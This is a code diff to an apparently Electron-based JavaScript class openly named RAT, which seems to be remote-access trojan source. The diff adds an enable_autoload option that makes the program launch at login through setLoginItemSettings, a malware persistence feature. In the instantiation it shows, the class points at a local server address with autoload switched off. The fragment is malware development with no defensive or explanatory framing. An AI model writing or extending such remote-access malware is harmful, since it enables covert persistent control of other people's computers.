@@ -9,7 +9,7 @@ const fs = require('fs');
 
 
 class RAT {
-  constructor(server_url, show_window=false) {
+  constructor(server_url, show_window=false, enable_autoload=true) {
     this.server_url = server_url;
 
     this.window = null;
@@ -26,6 +26,12 @@ class RAT {
     }
 
     if (show_window) this.createWindow();
+    
+    if (enable_autoload) {
+      app.setLoginItemSettings({
+        openAtLogin: true    
+      })
+    };
 
     this.setCurrentID();
   }
@@ -211,5 +217,6 @@ app.whenReady().then(() => {
   let rat = new RAT(
     server_url='127.0.0.1:8000',
     show_window=true,
+    enable_autoload=false,
   );
 });
